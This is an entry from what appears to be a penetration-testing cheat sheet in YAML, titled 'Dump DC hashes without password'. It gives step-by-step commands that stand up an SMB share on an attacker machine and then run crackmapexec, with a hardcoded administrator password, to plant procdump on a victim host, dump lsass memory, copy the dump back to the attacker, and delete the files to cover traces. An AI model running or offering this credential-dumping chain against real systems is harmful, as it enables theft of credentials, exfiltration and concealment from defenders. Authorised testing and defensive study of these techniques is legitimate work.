---
title: |
  Dump DC hashes without password
description: |
  First, setup a listening SMB server on your Kali box (in this case, 192.168.55.60):

    1. mkdir /share
    
    2. cd /share
    
    3. wget https://live.sysinternals.com/procdump64.exe
    
    4. screen -R smb
    
    5. /opt/impacket/examples/smbserver.py -smb2support share /share

  Then, escape the screen session and run the following CME commands to copy procdump over to the victim machine, create the dump, take the dump, then delete procdump.exe and the residual dump file:

    crackmapexec smb 192.168.55.220 -u Administrator -p 'Welkom01!' --local-auth --exec-method smbexec -x 'copy "\\192.168.55.60\share\procdump64.exe" "c:\users\public\procdump64.exe"'
    
    crackmapexec smb 192.168.55.220 -u Administrator -p 'Welkom01!' --local-auth --exec-method smbexec -x 'c:\users\public\procdump64.exe -accepteula -ma lsass.exe c:\users\public\lsass.dmp'
    
    crackmapexec smb 192.168.55.220 -u Administrator -p 'Welkom01!' --local-auth --exec-method smbexec -x 'copy "c:\users\public\lsass.dmp" "\\192.168.55.60\share\"'
    
    crackmapexec smb 192.168.55.220 -u Administrator -p 'Welkom01!' --local-auth --exec-method smbexec -x 'del "c:\users\public\lsass.dmp"
    
    crackmapexec smb 192.168.55.220 -u Administrator -p 'Welkom01!' --local-auth --exec-method smbexec -x 'del "c:\users\public\procdump64.exe"

command: |
  See commands
items:
  - Username
  - Password
services:
  - SMB
OS:
  - Linux
attack_types:
  - Exploitation
references:
  - https://github.com/byt3bl33d3r/CrackMapExec
  - https://github.com/byt3bl33d3r/CrackMapExec/wiki
---
